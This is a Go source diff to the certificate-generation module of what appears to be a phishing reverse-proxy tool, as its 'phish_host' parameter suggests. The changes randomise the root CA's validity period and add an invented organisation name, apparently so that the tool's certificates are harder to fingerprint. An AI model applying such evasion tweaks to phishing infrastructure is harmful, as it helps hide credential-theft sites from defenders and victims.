@@ -2,7 +2,7 @@ package core
 
 import (
 	"context"
-	"crypto/rand"
+	cryptoRand "crypto/rand"
 	"crypto/rsa"
 	"crypto/tls"
 	"crypto/x509"
@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"math/big"
+	"math/rand"
 	"os"
 	"path/filepath"
 	"strings"
@@ -89,7 +90,7 @@ func (o *CertDb) generateCertificates() error {
 		// private key corrupted or not found, recreate and delete all public certificates
 		os.RemoveAll(filepath.Join(o.cache_dir, "*"))
 
-		key, err = rsa.GenerateKey(rand.Reader, 2048)
+		key, err = rsa.GenerateKey(cryptoRand.Reader, 2048)
 		if err != nil {
 			return fmt.Errorf("private key generation failed")
 		}
@@ -116,10 +117,13 @@ func (o *CertDb) generateCertificates() error {
 	ca_cert, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
 	if err != nil {
 		notBefore := time.Now()
-		aYear := time.Duration(10*365*24) * time.Hour
-		notAfter := notBefore.Add(aYear)
+		minHours := 150
+		maxHours := 87600
+		randomHours := minHours + rand.Intn(maxHours-minHours+1)
+		randomDuration := time.Duration(randomHours) * time.Hour
+		notAfter := notBefore.Add(randomDuration)
 		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
-		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+		serialNumber, err := cryptoRand.Int(cryptoRand.Reader, serialNumberLimit)
 		if err != nil {
 			return err
 		}
@@ -127,11 +131,11 @@ func (o *CertDb) generateCertificates() error {
 		template := x509.Certificate{
 			SerialNumber: serialNumber,
 			Subject: pkix.Name{
-				Country:            []string{},
+				Country:            []string{"USA"},
 				Locality:           []string{},
-				Organization:       []string{""},
+				Organization:       []string{"Helldiver Solutions LLC"},
 				OrganizationalUnit: []string{},
-				CommonName:         "",
+				CommonName:         "Helldiver Solutions Root CA",
 			},
 			NotBefore:             notBefore,
 			NotAfter:              notAfter,
@@ -141,7 +145,7 @@ func (o *CertDb) generateCertificates() error {
 			IsCA:                  true,
 		}
 
-		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
+		cert, err := x509.CreateCertificate(cryptoRand.Reader, &template, &template, &key.PublicKey, key)
 		if err != nil {
 			return err
 		}
@@ -285,7 +289,7 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 
 	if phish_host == "" {
 		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
-		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+		serialNumber, err := cryptoRand.Int(cryptoRand.Reader, serialNumberLimit)
 		if err != nil {
 			return nil, err
 		}
@@ -308,7 +312,7 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 			return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
 		} else {
 			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
-			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+			serialNumber, err := cryptoRand.Int(cryptoRand.Reader, serialNumberLimit)
 			if err != nil {
 				return nil, err
 			}
@@ -330,12 +334,12 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 	}
 
 	var pkey *rsa.PrivateKey
-	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
+	if pkey, err = rsa.GenerateKey(cryptoRand.Reader, 1024); err != nil {
 		return
 	}
 
 	var derBytes []byte
-	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
+	if derBytes, err = x509.CreateCertificate(cryptoRand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
 		return
 	}
 
